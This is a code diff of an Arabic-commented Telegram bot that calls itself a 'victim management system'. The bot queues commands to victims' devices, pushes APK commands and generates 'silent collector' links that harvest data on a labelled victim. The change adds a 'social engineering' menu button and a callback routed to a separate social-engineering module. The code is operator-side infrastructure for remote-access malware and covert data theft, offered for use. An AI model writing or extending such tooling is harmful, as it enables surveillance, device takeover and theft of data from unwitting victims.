@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v8 — مع Silent Collector
+# v9 — مع Silent Collector + الهندسة الاجتماعية
 # ============================================================
 
 import io
@@ -36,7 +36,7 @@ from imports_manager import (
     queue_victim_command,
     # APK Manager
     build_apk_panel, push_apk_command,
-    # ★ Silent Collector
+    # Silent Collector
     generate_silent_link,
     get_silent_data,
     get_user_silent_sessions,
@@ -95,6 +95,12 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton(
         "🌐 لوحة التحكم (ويب)",
         callback_data="open_dashboard"
+    ))
+
+    # ★★★ الهندسة الاجتماعية ★★★
+    markup.add(InlineKeyboardButton(
+        "🎭 الهندسة الاجتماعية",
+        callback_data="gen_se"
     ))
 
     # ★ الأدوات
@@ -373,7 +379,7 @@ def start_command(message):
             f"⚡ <b>مرحباً {h(user_name)}</b>\n\n"
             f"🎯 نظام إدارة الضحايا\n\n"
             f"📱 اضغط <b>إدارة الضحايا</b> للبدء\n"
-            f"🌐 أو افتح <b>لوحة التحكم</b> من الزر"
+            f"🎭 أو افتح <b>الهندسة الاجتماعية</b>"
         )
 
     bot.send_message(
@@ -524,6 +530,16 @@ def callback_handler(call):
 
 def _handle_callback(call, chat_id, user_id, data):
     """المنطق الفعلي للـ callback"""
+
+    # ============================================================
+    # ★★★ الهندسة الاجتماعية ★★★
+    # ============================================================
+    try:
+        from social_engineering import handle_social_engineering_callback
+        if handle_social_engineering_callback(call, bot, chat_id, user_id, data):
+            return
+    except Exception as e:
+        logger.exception(f"SE handler error: {e}")
 
     # ============================================================
     # ★★★ Silent Collector ★★★
@@ -1625,7 +1641,7 @@ def _handle_callback(call, chat_id, user_id, data):
 
 
 # ============================================================
-# ★★★ Silent Collector Step Handler ★★★
+# Silent Collector Step Handler
 # ============================================================
 def silent_label_handler(message):
     """يستقبل اسم/وصف الضحية وينشئ الرابط"""
